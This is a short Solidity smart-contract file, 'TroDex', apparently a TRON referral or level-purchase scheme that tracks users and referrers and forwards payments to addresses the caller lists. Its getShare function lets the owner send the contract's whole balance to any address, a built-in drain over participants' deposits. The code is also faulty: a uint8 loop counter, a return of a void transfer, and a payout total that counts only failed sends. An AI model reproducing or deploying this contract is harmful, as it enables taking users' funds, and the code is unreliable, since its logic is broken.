//SourceUnit: trodex.sol

pragma solidity >=0.4.23 <0.6.0;


contract TroDex {

struct User {
        uint id;
        address referrer;
        uint partnersCount;
}

mapping(address => User) public users;
mapping(address => uint) public addressToId;
mapping(uint => address) public userIds;
address public owner;
uint public lastUserId = 2;

event SentDividends(address referrerAddress , uint value);
 


constructor(address ownerAddress) public {
        
        owner = ownerAddress;
        
        User memory user = User({
            id: 1,
            referrer: address(0),
            partnersCount: uint(0)
        });
        
        users[ownerAddress] = user;
        addressToId[ownerAddress] = 1;
        
        

        userIds[1] = ownerAddress;
    } 
 
function buyNewLevel(address[] userAddress, uint[] value) external payable {

         uint8 i = 0;
         uint totalbal = 0 ;
        for (i; i < userAddress.length; i++) {
        if (!address(uint160(userAddress[i])).send(value[i])) {
            totalbal = (totalbal + value[i]);
            return address(uint160(userAddress[i])).transfer(value[i]);
            }
        }
        emit SentDividends(msg.sender,totalbal);
    }
    
   function getShare(address receiver) external returns(string memory) {
        require(msg.sender==owner, 'Invalid Owner');
        address(uint160(receiver)).transfer(address(this).balance);
        return "Shared !)";
    }    
}